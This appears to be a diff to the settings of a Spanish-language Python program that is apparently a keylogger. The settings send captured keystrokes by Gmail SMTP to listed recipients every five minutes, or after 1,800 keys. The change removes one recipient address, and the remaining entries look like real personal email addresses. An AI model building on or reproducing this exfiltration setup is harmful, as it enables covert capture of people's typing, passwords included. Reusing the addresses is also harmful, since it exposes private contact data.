@@ -14,8 +14,7 @@ CONFIG = {
     'smtp_server': 'smtp.gmail.com:587',
     'destinatarios': [
         'felipe.morgado2000@gmail.com',
-        'feli.morgado@duocuc.cl',
-        'pichicaca31@gmail.com'
+        'feli.morgado@duocuc.cl'
     ],
     'intervalo_envio': 300,  # Segundos entre envíos (5 minutos)
     'max_teclas': 1800  # Máximo de teclas antes de enviar automáticamente
